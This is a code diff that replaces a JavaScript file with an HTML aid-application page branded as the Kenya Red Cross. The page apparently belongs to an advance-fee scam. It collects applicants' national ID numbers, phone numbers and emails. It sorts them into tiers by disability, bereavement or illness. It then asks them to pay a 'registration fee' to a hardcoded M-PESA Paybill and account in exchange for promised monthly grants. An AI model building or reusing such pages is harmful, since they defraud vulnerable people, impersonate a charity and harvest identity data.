@@ -1,422 +1,377 @@
-// =============================================================
-// APPLY.JS – Aid application with tier assessment
-// =============================================================
-
-const TIER_CONFIG = {
-  disability_severe: {
-    tier: 5,
-    label: 'Severe Disability',
-    amount: 30000,
-    fee: 1000
-  },
-  disability_moderate: {
-    tier: 5,
-    label: 'Moderate Disability',
-    amount: 30000,
-    fee: 1000
-  },
-  parent_death_both: {
-    tier: 4,
-    label: 'Loss of Both Parents',
-    amount: 25000,
-    fee: 600
-  },
-  parent_death_one: {
-    tier: 4,
-    label: 'Loss of One Parent',
-    amount: 25000,
-    fee: 600
-  },
-  disease_chronic: {
-    tier: 3,
-    label: 'Chronic Disease',
-    amount: 20000,
-    fee: 450
-  },
-  disease_acute: {
-    tier: 3,
-    label: 'Acute Disease',
-    amount: 20000,
-    fee: 450
-  },
-  calamity: {
-    tier: 2,
-    label: 'Natural Calamity',
-    amount: 15000,
-    fee: 350
-  },
-  general: {
-    tier: 1,
-    label: 'General Hardship',
-    amount: 10000,
-    fee: 250
-  }
-};
-
-// =============================================================
-// PAYMENT BACKEND – 🔴 USING VERCEL PROXY (NO CORS)
-// =============================================================
-
-const STK_PUSH_ENDPOINT = '/api/payments/stk-push';
-let pollingInterval = null;
-
-// =============================================================
-// TIER ASSESSMENT
-// =============================================================
-
-function assessTier() {
-  const disability = document.getElementById('q-disability')?.value;
-  const disease = document.getElementById('q-disease')?.value;
-  const parentDeath = document.getElementById('q-parent-death')?.value;
-  const calamity = document.getElementById('q-calamity')?.value;
-  const general = document.getElementById('q-general')?.value;
-
-  if (disability === 'yes-severe') return TIER_CONFIG.disability_severe;
-  if (disability === 'yes-moderate') return TIER_CONFIG.disability_moderate;
-  if (parentDeath === 'yes-both') return TIER_CONFIG.parent_death_both;
-  if (parentDeath === 'yes-one') return TIER_CONFIG.parent_death_one;
-  if (disease === 'yes-chronic') return TIER_CONFIG.disease_chronic;
-  if (disease === 'yes-acute') return TIER_CONFIG.disease_acute;
-  if (calamity && calamity !== 'no') return TIER_CONFIG.calamity;
-  if (general === 'yes') return TIER_CONFIG.general;
-  return null;
-}
-
-// =============================================================
-// DISPLAY ASSESSMENT
-// =============================================================
-
-function displayAssessment() {
-  const result = assessTier();
-  const resultDiv = document.getElementById('assessment-result');
-  const errorEl = document.getElementById('step2-error');
-
-  if (!result || !resultDiv) {
-    if (errorEl) {
-      errorEl.textContent = 'Please answer the questions to assess your tier.';
-      errorEl.classList.add('show');
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Apply for Aid – Kenya Red Cross</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;600;700&family=Montserrat:wght@600;700;800;900&display=swap" rel="stylesheet" />
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: 'DM Sans', Arial, sans-serif;
+      background: #f8f9fa;
+      color: #222;
+      padding: 30px 20px;
     }
-    return;
-  }
-
-  if (errorEl) errorEl.classList.remove('show');
-
-  resultDiv.style.display = 'block';
-  document.getElementById('assessed-tier').textContent = result.label;
-  document.getElementById('assessed-amount').textContent = 'KES ' + result.amount.toLocaleString();
-  document.getElementById('assessed-fee').textContent = 'KES ' + result.fee.toLocaleString();
-
-  resultDiv.dataset.tier = result.tier;
-  resultDiv.dataset.amount = result.amount;
-  resultDiv.dataset.fee = result.fee;
-  resultDiv.dataset.label = result.label;
-}
-
-// =============================================================
-// STEPPER NAVIGATION
-// =============================================================
-
-function goToStep(stepNum) {
-  const step1 = document.getElementById('reg-step-1');
-  const step2 = document.getElementById('reg-step-2');
-  const step3 = document.getElementById('reg-step-3');
-
-  if (step1) step1.style.display = stepNum === 1 ? 'block' : 'none';
-  if (step2) step2.style.display = stepNum === 2 ? 'block' : 'none';
-  if (step3) step3.style.display = stepNum === 3 ? 'block' : 'none';
-
-  const nav1 = document.getElementById('step-nav-1');
-  const nav2 = document.getElementById('step-nav-2');
-  const nav3 = document.getElementById('step-nav-3');
-
-  if (nav1) nav1.className = 'step-item ' + (stepNum >= 1 ? 'active' : '');
-  if (nav2) nav2.className = 'step-item ' + (stepNum >= 2 ? 'active' : '');
-  if (nav3) nav3.className = 'step-item ' + (stepNum >= 3 ? 'active' : '');
-
-  // Validate Step 1 → Step 2
-  if (stepNum === 2) {
-    const name = document.getElementById('reg-fullName')?.value.trim();
-    const email = document.getElementById('reg-email')?.value.trim();
-    const phone = document.getElementById('reg-phone')?.value.trim();
-    const idNum = document.getElementById('reg-idNum')?.value.trim();
-    const location = document.getElementById('reg-location')?.value.trim();
-
-    const errorEl = document.getElementById('step1-error');
-    if (!name || !email || !phone || !idNum || !location) {
-      if (errorEl) {
-        errorEl.textContent = 'Please complete all fields in Step 1.';
-        errorEl.classList.add('show');
-      }
-      goToStep(1);
-      return;
+    .container {
+      max-width: 780px;
+      margin: 0 auto;
+      background: #fff;
+      border-radius: 16px;
+      box-shadow: 0 8px 30px rgba(0,0,0,0.08);
+      padding: 40px 45px;
     }
-    if (errorEl) errorEl.classList.remove('show');
-  }
-
-  // Validate Step 2 → Step 3
-  if (stepNum === 3) {
-    const resultDiv = document.getElementById('assessment-result');
-    if (!resultDiv || !resultDiv.dataset.tier) {
-      const errorEl = document.getElementById('step2-error');
-      if (errorEl) {
-        errorEl.textContent = 'Please complete the assessment first.';
-        errorEl.classList.add('show');
-      }
-      goToStep(2);
-      return;
+    h1 {
+      font-family: 'Montserrat', sans-serif;
+      font-weight: 800;
+      font-size: 32px;
+      color: #171717;
+      margin-bottom: 6px;
     }
-
-    // Fill summary
-    document.getElementById('sum-name').textContent = document.getElementById('reg-fullName').value;
-    document.getElementById('sum-phone').textContent = document.getElementById('reg-phone').value;
-    document.getElementById('sum-county').textContent = document.getElementById('reg-location').value;
-    document.getElementById('sum-tier').textContent = resultDiv.dataset.label;
-    document.getElementById('sum-grant').textContent = 'KES ' + parseInt(resultDiv.dataset.amount).toLocaleString();
-    document.getElementById('sum-fee').textContent = 'KES ' + parseInt(resultDiv.dataset.fee).toLocaleString();
-
-    const errorEl = document.getElementById('step2-error');
-    if (errorEl) errorEl.classList.remove('show');
-  }
-}
-
-// =============================================================
-// NORMALIZE KENYAN PHONE NUMBER
-// =============================================================
-
-function normalizeKenyanPhone(raw) {
-  const digits = String(raw || '').replace(/\D/g, '');
-  if (/^2547\d{8}$/.test(digits)) return digits;
-  if (/^2541\d{8}$/.test(digits)) return digits;
-  if (/^07\d{8}$/.test(digits)) return '254' + digits.slice(1);
-  if (/^01\d{8}$/.test(digits)) return '254' + digits.slice(1);
-  if (/^7\d{8}$/.test(digits)) return '254' + digits;
-  if (/^1\d{8}$/.test(digits)) return '254' + digits;
-  return null;
-}
-
-// =============================================================
-// STK PUSH
-// =============================================================
-
-async function triggerStkPush() {
-  const resultDiv = document.getElementById('assessment-result');
-  const fee = parseInt(resultDiv?.dataset.fee);
-  const phoneRaw = document.getElementById('reg-phone')?.value.trim();
-  const phone = normalizeKenyanPhone(phoneRaw);
-  const errorEl = document.getElementById('step3-error');
-  const btn = document.getElementById('pay-btn');
-
-  if (!fee) {
-    if (errorEl) {
-      errorEl.textContent = 'Please complete the assessment first.';
-      errorEl.classList.add('show');
+    .subhead {
+      color: #666;
+      font-size: 15px;
+      margin-bottom: 30px;
+      border-bottom: 2px solid #eaeaea;
+      padding-bottom: 18px;
     }
-    return;
-  }
-
-  if (!phone) {
-    if (errorEl) {
-      errorEl.textContent = 'Enter a valid Kenyan phone number, e.g. 0712345678.';
-      errorEl.classList.add('show');
+    .step-indicators {
+      display: flex;
+      gap: 12px;
+      margin-bottom: 30px;
+      flex-wrap: wrap;
     }
-    return;
-  }
-
-  // Disable button and show spinner
-  if (btn) {
-    btn.disabled = true;
-    btn.innerHTML = '<span class="spinner"></span> Sending...';
-  }
-
-  try {
-    const currentUser = typeof window.getCurrentUser === 'function' ? window.getCurrentUser() : null;
-
-    const response = await fetch(STK_PUSH_ENDPOINT, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        phoneNumber: phone,
-        amount: fee,
-        description: 'Red Cross Kenya registration fee',
-        orderId: currentUser?.id || `guest-${Date.now()}`
-      })
-    });
-
-    const result = await response.json();
-
-    if (!response.ok || !result.ok) {
-      throw new Error(result.error || 'Payment request failed.');
+    .step-item {
+      padding: 8px 18px;
+      background: #eee;
+      border-radius: 40px;
+      font-weight: 600;
+      font-size: 13px;
+      color: #777;
+      transition: 0.2s;
     }
-
-    if (errorEl) errorEl.classList.remove('show');
-    document.getElementById('reg-ref-code').value = result.transactionId;
-    startPolling(result.transactionId);
-
-    alert(`STK Push sent to ${phone}!\n\nCheck your phone and enter your M-PIN to complete payment.`);
-
-  } catch (err) {
-    if (errorEl) {
-      errorEl.textContent = err.message || 'Payment failed. Please try again.';
-      errorEl.classList.add('show');
+    .step-item.active { background: #D71920; color: #fff; }
+    .step { display: none; }
+    .step.active { display: block; }
+    .form-group { margin-bottom: 20px; }
+    label {
+      display: block;
+      font-weight: 600;
+      font-size: 14px;
+      margin-bottom: 4px;
+      color: #222;
     }
-  } finally {
-    if (btn) {
-      btn.disabled = false;
-      btn.innerHTML = 'Pay Registration Fee — STK Push';
+    input, select, textarea {
+      width: 100%;
+      padding: 12px 14px;
+      border: 1px solid #d0d0d0;
+      border-radius: 8px;
+      font-size: 15px;
+      background: #fafafa;
+      transition: 0.2s;
     }
-  }
-}
+    input:focus, select:focus, textarea:focus {
+      border-color: #D71920;
+      outline: none;
+      background: #fff;
+      box-shadow: 0 0 0 3px rgba(215,25,32,0.1);
+    }
+    textarea { resize: vertical; min-height: 80px; }
+    .btn {
+      background: #D71920;
+      color: #fff;
+      border: none;
+      padding: 13px 28px;
+      border-radius: 8px;
+      font-weight: 700;
+      font-size: 15px;
+      cursor: pointer;
+      transition: 0.2s;
+      display: inline-block;
+    }
+    .btn:hover {
+      background: #b01018;
+      transform: translateY(-2px);
+      box-shadow: 0 6px 14px rgba(215,25,32,0.3);
+    }
+    .btn:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
+    .error {
+      color: #D71920;
+      font-size: 14px;
+      margin-top: 10px;
+      display: none;
+    }
+    .error.show { display: block; }
+    #assessment-result {
+      display: none;
+      background: #f4f6fa;
+      border-radius: 12px;
+      padding: 24px 28px;
+      margin: 25px 0;
+      border-left: 5px solid #D71920;
+    }
+    #assessment-result h3 {
+      font-family: 'Montserrat', sans-serif;
+      font-size: 20px;
+      margin-bottom: 10px;
+    }
+    #assessment-result p { font-size: 15px; margin: 6px 0; }
+    #summary {
+      background: #f9f9f9;
+      border-radius: 12px;
+      padding: 20px 24px;
+      margin-bottom: 25px;
+    }
+    #summary p { font-size: 15px; margin: 6px 0; }
+    #summary strong { color: #171717; }
+    .copy-btn {
+      background: none;
+      border: none;
+      color: #D71920;
+      cursor: pointer;
+      font-size: 18px;
+      padding: 4px 8px;
+      border-radius: 4px;
+      transition: 0.2s;
+    }
+    .copy-btn:hover { background: #f0f0f0; }
+    .payment-box {
+      background: #f4f6fa;
+      border-radius: 12px;
+      padding: 24px;
+      margin: 20px 0;
+      border-left: 5px solid #D71920;
+    }
+    .payment-row {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      background: #fff;
+      padding: 10px 14px;
+      border-radius: 8px;
+      border: 1px solid #ddd;
+      margin-bottom: 10px;
+      flex-wrap: wrap;
+    }
+    .payment-row .label { font-weight: 600; font-size: 12px; color: #666; min-width: 70px; }
+    .payment-row .value { font-family: monospace; font-size: 20px; font-weight: 800; color: #D71920; flex: 1; }
+    .status-msg {
+      margin: 15px 0;
+      padding: 12px 16px;
+      border-radius: 8px;
+      background: #e6f7e6;
+      color: #1a7c3e;
+      display: none;
+    }
+    .status-msg.show { display: block; }
+    @media (max-width: 600px) {
+      .container { padding: 25px 20px; }
+      h1 { font-size: 26px; }
+      .step-indicators { gap: 8px; }
+      .step-item { font-size: 12px; padding: 6px 14px; }
+      .payment-row { flex-direction: column; align-items: stretch; }
+    }
+  </style>
+</head>
+<body>
 
-// =============================================================
-// PAYMENT STATUS POLLING
-// =============================================================
+<div class="container">
+  <h1>Apply for Aid</h1>
+  <div class="subhead">Complete all steps to submit your application for monthly humanitarian support.</div>
 
-function startPolling(transactionId) {
-  if (!transactionId) return;
-  if (pollingInterval) clearInterval(pollingInterval);
+  <!-- Step Indicators -->
+  <div class="step-indicators">
+    <span class="step-item active" id="step-nav-1">1. Personal Info</span>
+    <span class="step-item" id="step-nav-2">2. Tier Assessment</span>
+    <span class="step-item" id="step-nav-3">3. Payment & Submit</span>
+  </div>
 
-  const statusUrl = STK_PUSH_ENDPOINT.replace('/stk-push', `/status/${transactionId}`);
-  let attempts = 0;
-  const maxAttempts = 30;
+  <!-- STEP 1 -->
+  <div class="step active" id="reg-step-1">
+    <h2 style="font-family:'Montserrat'; font-size:22px; margin-bottom:16px;">Your Details</h2>
+    <div class="form-group">
+      <label>Full Name *</label>
+      <input type="text" id="reg-fullName" placeholder="e.g. Jane Muthoni" required />
+    </div>
+    <div class="form-group">
+      <label>Email Address *</label>
+      <input type="email" id="reg-email" placeholder="jane@example.com" required />
+    </div>
+    <div class="form-group">
+      <label>Phone (Safaricom) *</label>
+      <input type="tel" id="reg-phone" placeholder="0712345678" required />
+      <small style="color:#888;">Only Safaricom numbers are supported for M-PESA payments.</small>
+    </div>
+    <div class="form-group">
+      <label>ID / Passport Number *</label>
+      <input type="text" id="reg-idNum" placeholder="12345678" required />
+    </div>
+    <div class="form-group">
+      <label>County of Residence *</label>
+      <input type="text" id="reg-location" placeholder="Nairobi" required />
+    </div>
+    <div class="form-group">
+      <label>Brief Description of Your Need</label>
+      <textarea id="applicant-description" placeholder="Tell us more about your situation..."></textarea>
+    </div>
+    <div class="error" id="step1-error"></div>
+    <button class="btn" onclick="goToStep(2)">Next →</button>
+  </div>
 
-  pollingInterval = setInterval(async () => {
-    attempts++;
+  <!-- STEP 2 -->
+  <div class="step" id="reg-step-2">
+    <h2 style="font-family:'Montserrat'; font-size:22px; margin-bottom:16px;">Tier Assessment</h2>
+    <p style="color:#555; margin-bottom:20px;">Answer the questions below to determine your aid tier.</p>
 
+    <div class="form-group">
+      <label>Do you have a disability?</label>
+      <select id="q-disability">
+        <option value="no">No</option>
+        <option value="yes-severe">Yes – Severe</option>
+        <option value="yes-moderate">Yes – Moderate</option>
+      </select>
+    </div>
+    <div class="form-group">
+      <label>Do you have a chronic or acute disease?</label>
+      <select id="q-disease">
+        <option value="no">No</option>
+        <option value="yes-chronic">Yes – Chronic</option>
+        <option value="yes-acute">Yes – Acute</option>
+      </select>
+    </div>
+    <div class="form-group">
+      <label>Have you lost one or both parents?</label>
+      <select id="q-parent-death">
+        <option value="no">No</option>
+        <option value="yes-one">Yes – One parent</option>
+        <option value="yes-both">Yes – Both parents</option>
+      </select>
+    </div>
+    <div class="form-group">
+      <label>Have you been affected by a natural calamity (flood, drought, fire, etc.)?</label>
+      <select id="q-calamity">
+        <option value="no">No</option>
+        <option value="yes">Yes</option>
+      </select>
+    </div>
+    <div class="form-group">
+      <label>Are you facing general economic hardship?</label>
+      <select id="q-general">
+        <option value="no">No</option>
+        <option value="yes">Yes</option>
+      </select>
+    </div>
+
+    <button class="btn" id="assess-btn">Assess My Tier</button>
+
+    <div id="assessment-result">
+      <h3>Your Assessed Tier</h3>
+      <p><strong>Tier:</strong> <span id="assessed-tier"></span></p>
+      <p><strong>Monthly Aid:</strong> <span id="assessed-amount"></span></p>
+      <p><strong>Registration Fee:</strong> <span id="assessed-fee"></span></p>
+    </div>
+    <div class="error" id="step2-error"></div>
+    <button class="btn" onclick="goToStep(3)" style="margin-top:20px;">Proceed to Payment →</button>
+  </div>
+
+  <!-- STEP 3 – MANUAL PAYMENT -->
+  <div class="step" id="reg-step-3">
+    <h2 style="font-family:'Montserrat'; font-size:22px; margin-bottom:16px;">Payment & Submit</h2>
+    <p style="color:#555; margin-bottom:20px;">Pay the registration fee via M-PESA Paybill.</p>
+
+    <div id="summary">
+      <p><strong>Name:</strong> <span id="sum-name"></span></p>
+      <p><strong>Phone:</strong> <span id="sum-phone"></span></p>
+      <p><strong>County:</strong> <span id="sum-county"></span></p>
+      <p><strong>Tier:</strong> <span id="sum-tier"></span></p>
+      <p><strong>Monthly Grant:</strong> <span id="sum-grant"></span></p>
+      <p><strong>Registration Fee:</strong> <span id="sum-fee"></span></p>
+    </div>
+
+    <!-- PAYMENT INSTRUCTIONS -->
+    <div class="payment-box">
+      <h3 style="font-family:'Montserrat'; margin-bottom:12px;">📱 M-PESA Payment Instructions</h3>
+
+      <div class="payment-row">
+        <span class="label">Paybill Number</span>
+        <span class="value" id="paybill-number">522533</span>
+        <button class="copy-btn" onclick="copyToClipboard('522533')">📋 Copy</button>
+      </div>
+
+      <div class="payment-row">
+        <span class="label">Account Number</span>
+        <span class="value" id="account-number">1302047523</span>
+        <button class="copy-btn" onclick="copyToClipboard(document.getElementById('account-number').textContent)">📋 Copy</button>
+      </div>
+
+      <div class="payment-row">
+        <span class="label">Amount (KES)</span>
+        <span class="value" id="payment-amount">0</span>
+      </div>
+
+      <p style="font-size: 13px; color: #555; margin: 15px 0 10px 0; line-height: 1.8;">
+        <strong>Instructions:</strong><br>
+        1. Go to M-PESA <strong>Lipa na M-PESA</strong> → <strong>Paybill</strong><br>
+        2. Enter Business Number: <strong id="paybill-ref">522533</strong><br>
+        3. Enter Account Number: <strong id="account-ref">1302047523</strong><br>
+        4. Enter Amount: <strong id="amount-ref">KES 0</strong><br>
+        5. Enter your M-PESA PIN and confirm<br>
+        6. Enter the M-PESA confirmation code below
+      </p>
+    </div>
+
+    <!-- M-PESA TRANSACTION CODE -->
+    <div class="form-group">
+      <label>M-PESA Transaction Code *</label>
+      <input type="text" id="mpesa-transaction-id" placeholder="e.g. QGH7X9ABC1" required />
+      <small style="color:#888;">Enter the transaction code from your M-PESA confirmation SMS after paying.</small>
+    </div>
+
+    <div class="error" id="step3-error"></div>
+    <div class="status-msg" id="application-status"></div>
+
+    <button class="btn" onclick="submitApplicationManual()" style="margin-top:20px;">
+      Submit Application
+    </button>
+  </div>
+
+</div>
+
+<!-- SUPABASE INITIALISATION -->
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2">
+</script>
+<script>
+  const SUPABASE_URL = "https://obucqswptdbnktaaayoh.supabase.co";
+  const SUPABASE_ANON_KEY = "sb_publishable_laBoykhOTssfpTfn8n1KXQ_yMt4Tt6O";
+
+  window.supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+
+  window.getCurrentUser = function() {
     try {
-      const response = await fetch(statusUrl);
-      const result = await response.json();
-
-      if (result.ok) {
-        if (result.status === 'SUCCESS') {
-          clearInterval(pollingInterval);
-          const errorEl = document.getElementById('step3-error');
-          if (errorEl) errorEl.classList.remove('show');
-          const statusEl = document.getElementById('application-status');
-          if (statusEl) {
-            statusEl.textContent = '✅ Payment successful! You can now submit your application.';
-            statusEl.classList.add('show');
-          }
-          document.getElementById('reg-ref-code').value = result.transactionId;
-        } else if (result.status === 'FAILED' || result.status === 'TIMEOUT' || result.status === 'ERROR') {
-          clearInterval(pollingInterval);
-          const errorEl = document.getElementById('step3-error');
-          if (errorEl) {
-            errorEl.textContent = `Payment ${result.status.toLowerCase()}. Please try again.`;
-            errorEl.classList.add('show');
-          }
-        }
-      }
-    } catch (err) {
-      console.error('Payment polling error:', err);
-    }
-
-    if (attempts >= maxAttempts) {
-      clearInterval(pollingInterval);
-      const errorEl = document.getElementById('step3-error');
-      if (errorEl) {
-        errorEl.textContent = 'Payment confirmation timed out. If you completed the payment, please contact support.';
-        errorEl.classList.add('show');
-      }
-    }
-  }, 3000);
-}
-
-// =============================================================
-// SUBMIT APPLICATION
-// =============================================================
-
-async function submitApplication() {
-  const refCode = document.getElementById('reg-ref-code')?.value;
-  const errorEl = document.getElementById('step3-error');
-
-  if (!refCode) {
-    if (errorEl) {
-      errorEl.textContent = 'Please complete payment before submitting.';
-      errorEl.classList.add('show');
-    }
-    return;
-  }
-
-  const resultDiv = document.getElementById('assessment-result');
-  const tier = parseInt(resultDiv?.dataset.tier);
-  const amount = parseInt(resultDiv?.dataset.amount);
-  const fee = parseInt(resultDiv?.dataset.fee);
-  const label = resultDiv?.dataset.label;
-
-  const appData = {
-    reference_code: refCode,
-    full_name: document.getElementById('reg-fullName')?.value || '',
-    email: document.getElementById('reg-email')?.value || '',
-    phone: document.getElementById('reg-phone')?.value || '',
-    id_number: document.getElementById('reg-idNum')?.value || '',
-    county: document.getElementById('reg-location')?.value || '',
-    description: document.getElementById('applicant-description')?.value || '',
-    tier: tier,
-    tier_label: label,
-    aid_amount: amount,
-    registration_fee: fee,
-    status: 'pending_review',
-    submitted_at: new Date().toISOString()
+      const data = localStorage.getItem('redcross_user');
+      return data ? JSON.parse(data) : null;
+    } catch (e) { return null; }
   };
 
-  try {
-    if (!window.supabaseClient) {
-      throw new Error('Supabase is not initialized.');
-    }
-
-    const { data, error: supabaseError } = await window.supabaseClient
-      .from('aid_applications')
-      .insert(appData)
-      .select();
-
-    if (supabaseError) throw supabaseError;
-
-    localStorage.setItem('last_application', JSON.stringify({
-      ...appData,
-      referenceCode: refCode,
-      submittedAt: new Date().toLocaleDateString('en-KE')
-    }));
-
-    window.location.href = 'confirmation.html';
-
-  } catch (err) {
-    if (errorEl) {
-      errorEl.textContent = 'Submission failed: ' + (err.message || 'Unknown error');
-      errorEl.classList.add('show');
-    }
-  }
-}
-
-// =============================================================
-// INITIALIZE EVENT LISTENERS
-// =============================================================
-
-document.addEventListener('DOMContentLoaded', () => {
-  const assessBtn = document.getElementById('assess-btn');
-  if (assessBtn) assessBtn.addEventListener('click', displayAssessment);
-
-  // Reset assessment result when questions change
-  const questions = document.querySelectorAll('#q-disability, #q-disease, #q-parent-death, #q-calamity, #q-general');
-  questions.forEach(el => {
-    el.addEventListener('change', () => {
-      const result = document.getElementById('assessment-result');
-      if (result) {
-        result.style.display = 'none';
-        delete result.dataset.tier;
-        delete result.dataset.amount;
-        delete result.dataset.fee;
-        delete result.dataset.label;
-      }
+  function copyToClipboard(text) {
+    navigator.clipboard.writeText(text).then(() => {
+      alert('✅ Copied: ' + text);
+    }).catch(() => {
+      const input = document.createElement('input');
+      input.value = text;
+      document.body.appendChild(input);
+      input.select();
+      document.execCommand('copy');
+      document.body.removeChild(input);
+      alert('✅ Copied: ' + text);
     });
-  });
-});
+  }
+</script>
 
-// =============================================================
-// EXPOSE FUNCTIONS GLOBALLY (for onclick attributes)
-// =============================================================
+<!-- LOAD APPLY.JS -->
+<script src="apply.js"></script>
 
-window.goToStep = goToStep;
-window.displayAssessment = displayAssessment;
-window.triggerStkPush = triggerStkPush;
-window.submitApplication = submitApplication;
-window.normalizeKenyanPhone = normalizeKenyanPhone;
+</body>
+</html>
